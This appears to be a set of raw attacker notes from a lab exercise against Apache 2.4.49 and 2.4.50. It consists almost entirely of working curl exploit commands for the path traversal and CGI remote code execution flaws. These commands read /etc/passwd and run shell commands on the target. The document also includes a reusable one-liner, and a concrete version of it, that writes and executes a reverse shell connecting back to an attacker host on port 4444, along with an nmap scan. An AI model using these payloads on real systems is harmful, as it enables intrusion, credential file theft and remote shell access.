# apache 2.4.49
curl -v 'http://10.10.209.80:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd'

# apache 2.4.49 (CGI)
curl -v 'http://10.10.209.80:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash' -d 'echo Content-Type: text/plain; echo; cat /etc/passwd' -H "Content-Type: text/plain"

# apache 2.4.50
curl 'http://10.10.209.80:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd'



    Apache 2.4.49 without CGI: http://10.10.209.80:8080
    Apache 2.4.49 with CGI: http://10.10.209.80:8081
    Apache 2.4.50 without CGI: http://10.10.209.80:8082
    Apache 2.4.50 with CGI: http://10.10.209.80:8083


Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-04 19:37 CEST
PORT     STATE  SERVICE         VERSION
22/tcp   open   ssh             OpenSSH 8.0 (protocol 2.0)
8080/tcp closed http-proxy
8081/tcp closed blackice-icecap
8082/tcp closed blackice-alerts
8083/tcp closed us-srv
9090/tcp closed zeus-admin
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .


curl 'http://10.10.209.80:8083/cgi-bin/..%2e/..%2e/..%2e/..%2e/..%2e/..%2e/..%2e/etc/passwd' -d 'echo Content-Type: text/plain; echo; cat /etc/passwd' -H "Content-Type: text/plain"



curl -v 'http://10.10.209.80:8083/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/bash' -d 'echo Content-Type: text/plain; echo; cat /etc/passwd' -H "Content-Type: text/plain"


curl "$1/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh" -d "echo Content-Type: text/plain; echo; echo '/bin/sh -i >& /dev/tcp/$2/$3 0>&1' > /tmp/revoshell.sh" && curl "$1/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh" -d "echo Content-Type: text/plain; echo; bash  /tmp/revoshell.sh"


curl 'http://10.10.209.80:8083/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/bash' -d "echo Content-Type: text/plain; echo; echo '/bin/sh -i >& /dev/tcp/10.18.60.127/4444 0>&1' > /tmp/revoshell.sh" -H "Content-Type: text/plain" && curl 'http://10.10.209.80:8083/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/bash' -d "echo Content-Type: text/plain; echo; bash /tmp/revoshell.sh" -H "Content-Type: text/plain" 